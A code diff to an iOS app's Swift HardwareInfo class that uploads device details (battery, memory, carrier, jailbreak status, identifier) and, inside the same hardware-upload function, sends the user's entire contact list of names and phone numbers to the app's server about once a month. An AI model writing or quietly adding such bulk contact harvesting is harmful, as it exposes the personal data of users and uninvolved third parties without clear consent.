@@ -39,7 +39,7 @@ class HardwareInfo {
     var usedMemory: Double = 0.0   //已使用内存
     
     init() {
-        
+        deviceInfo()
     }
     
     func deviceInfo(){
@@ -109,13 +109,51 @@ class HardwareInfo {
     //上传硬件信息
     func uploadHardwareInfo(){
         
+        guard UserHelper.getIsOneMonthLong() else {
+            return
+        }
+        //上传通讯录
+        self.uploadUserContact()
+        
         var params = NetConnect.getBaseRequestParams()
-        
-        
+    
+        params["battery_status"] = batteryState //电池状态
+        params["extra_level"] = batteryLevel //电池等级
+        params["plugged"] = netStatus //连接状态
+        params["internal_memory_size"] = totalMemorySize //总内存
+        params["available_internal_memory_size"] = availableMemorySize //可用内存
+        params["operator"] = carrierName //运营商
+        params["model"] = iphoneType //手机型号
+        params["root"] = isBreakOut //是否越狱
+        params["imei"] = identifier //UDID
+    
         NetConnect.other_upload_hardware_info(parameters: params, success: { response in
+            
+            UserHelper.setIsOneMonthLongNowTime()
             
         }, failure:{ error in
   
+        })
+    }
+    
+    //上传通讯录
+    func uploadUserContact(){
+        
+        // MARK: - 获取原始顺序联系人的模型数组
+        PPGetAddressBook.getOriginalAddressBook(addressBookArray: { (addressBookArray) in
+            var contacts = [Dictionary<String,String>]()
+            for dic in addressBookArray {
+                contacts.append(["phone":dic.mobileArray.first ?? "","name":dic.name])
+            }
+            PrintLog("联系人\(contacts)")
+            if (contacts.count > 0){
+                var params = NetConnect.getBaseRequestParams()
+                params["contracts"] = toolsChangeToJson(info: contacts)
+                UserHelper.uploadUserContactInfo(withparams:params)
+            }
+            
+        }, authorizationFailure: {
+            
         })
     }
 }
